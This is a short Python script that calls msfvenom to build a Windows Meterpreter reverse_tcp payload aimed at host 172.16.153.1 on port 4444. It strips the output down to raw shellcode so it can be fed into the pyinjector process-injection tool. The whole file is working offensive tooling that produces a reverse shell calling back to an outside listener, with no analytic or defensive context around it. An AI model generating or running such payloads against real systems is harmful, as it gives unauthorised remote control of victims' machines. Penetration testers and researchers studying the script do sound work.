# quick script that generates the proper format for the shellcode to feed into pyinjector
# generates powershell payload  from @trustedsec pyinjector
import subprocess,re
def generate_powershell_shellcode(payload,ipaddr,port):
    # grab the metasploit path
    msf_path = "/usr/local/share/metasploit-framework/"
    # generate payload
    proc = subprocess.Popen("%smsfvenom -p %s LHOST=%s LPORT=%s -a x86  --platform Windows EXITFUNC=thread -f python" % (msf_path,payload,ipaddr,port), stdout=subprocess.PIPE, shell=True)
    data = proc.communicate()[0]
    # start to format this a bit to get it ready
    data = data.replace(";", "")
    data = data.replace(" ", "")
    data = data.replace("+", "")
    data = data.replace('"', "")
    data = data.replace("\n", "")
    data = data.replace("buf=", "")
    data = data.rstrip()
    # base counter
    print data


generate_powershell_shellcode("windows/meterpreter/reverse_tcp", "172.16.153.1", "4444")